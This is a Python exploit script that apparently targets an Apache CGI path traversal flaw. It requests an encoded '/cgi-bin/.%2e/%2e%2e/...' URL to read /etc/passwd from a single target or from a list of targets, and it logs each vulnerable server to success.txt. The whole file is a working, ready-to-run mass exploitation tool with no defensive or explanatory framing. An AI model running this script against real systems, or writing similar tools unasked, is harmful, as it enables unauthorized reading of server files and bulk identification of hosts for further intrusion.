#!/usr/bin/env python3

import requests, re, subprocess, os, argparse, sys, urllib.request, socket

def exploit(target):
    url = target+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
    req = urllib.request.Request(url)
    try: 
        salida = urllib.request.urlopen(req, timeout=5)
        if salida.status == 200:
            contenido = salida.read().decode('utf-8')
            if 'root:' in contenido:            
                print("(+) Server {} is \033[1;32mvulnerable\033[1;37m" .format(target))
                f=open("success.txt", "a+")
                f.write("{}\n" .format(target))
                f.close()
        else:
            print("(+)\033[1;31m Server {} is not vulnerable\033[1;37m" .format(target))
    except urllib.error.URLError as e:
        print("(+) Server {} is \033[1;31mnot vulnerable\033[1;37m" .format(target))
    except socket.timeout:
        print("(+) Server {} is \033[1;31mnot response\033[1;37m" .format(target))
    except ConnectionResetError:
        print("(+) Server {} \033[1;31mconnection reset\033[1;37m" .format(target))

def readfile(filename):

    with open(filename, "r") as file:
        Lines = file.readlines()
        count = 0

        for line in Lines:
            count += 1
            exploit(line.strip())

def main(args):

    if args.target != "False":

        exploit(args.target)

    elif args.file != "False":

        readfile(args.file)

if __name__ == "__main__":
    
    ## parse argument
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", action="store", help="Target url", default="False")
    parser.add_argument("-f", "--file", action="store", help="List of target url", default="False")
    args = parser.parse_args()

    if len(sys.argv[1:])==0:
        parser.print_help()
        parser.exit()

    try:
        main(args)

    except KeyboardInterrupt:
        print('\n\033[1;31m[!] Abort\033[1;37m')
